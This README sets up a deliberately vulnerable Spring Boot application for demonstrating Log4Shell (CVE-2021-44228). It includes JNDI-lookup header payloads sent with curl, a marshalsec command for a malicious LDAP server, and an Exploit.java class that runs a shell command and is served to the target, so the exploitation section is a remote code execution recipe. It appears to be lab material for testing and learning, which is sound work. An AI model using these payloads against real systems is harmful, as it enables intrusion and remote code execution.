# Log4Shell sample vulnerable application (CVE-2021-44228)

This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).

It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.8.0_191.

![](./screenshot.png)

## Running the application

Run it:

```bash
docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```

Build it yourself (you don't need any Java-related tooling):

```bash
docker build . -t vulnerable-app
docker run -p 8080:8080 vulnerable-app
```

## Exploitation

You can confirm the application is vulnerable by running:

```bash
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1/a}'
```

You will see the following stack trace in the application logs:

```
2021-12-10 12:43:13,416 http-nio-8080-exec-1 WARN Error looking up JNDI resource [ldap://127.0.0.1/a]. javax.naming.CommunicationException: 127.0.0.1:389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
	at com.sun.jndi.ldap.Connection.<init>(Connection.java:238)
	at com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)
	at com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1615)
	at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2749)
	at com.sun.jndi.ldap.LdapCtx.<init>(LdapCtx.java:319)
	at com.sun.jndi.url.ldap.ldapURLContextFactory.getUsingURLIgnoreRootDN(ldapURLContextFactory.java:60)
	at com.sun.jndi.url.ldap.ldapURLContext.getRootURLContext(ldapURLContext.java:61)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:202)
	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
```

## Note

While this is enough to show the application is vulnerable, I do not have a full PoC yet. As explained in LunaSec's advisory, the exploitation steps should be:
* Use [MarshelSec](https://github.com/mbechler/marshalsec) to run a malicious LDAP server:

```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://your-local-ip:8888/#Exploit"
```

* Generate `Exploit.class` as follows:

```
cat >> Exploit.java <<EOF
class Exploit {
    static {
        try { Runtime.getRuntime().exec("touch /pwned"); } catch(Exception e) {}
    }
}
EOF
javac Exploit.java
```

* Make the file available: `python3 -m http.server --bind 0.0.0.0 8888`

* Trigger the exploit: `curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.1.143:1389}`

Unfortunately, I am experiencing the same issue with marshalsec as other people (see [marshalsec#20](https://github.com/mbechler/marshalsec/issues/20)) where the first-stage of the exploit is triggered, but the second stage is not.

That said, I believe the output above is enough to demonstrate the application is vulnerable, since (1) it connects to the LDAP server, and (2) it doesn't connect to the LDAP server when using a patched version of log4j.

## Reference

https://www.lunasec.io/docs/blog/log4j-zero-day/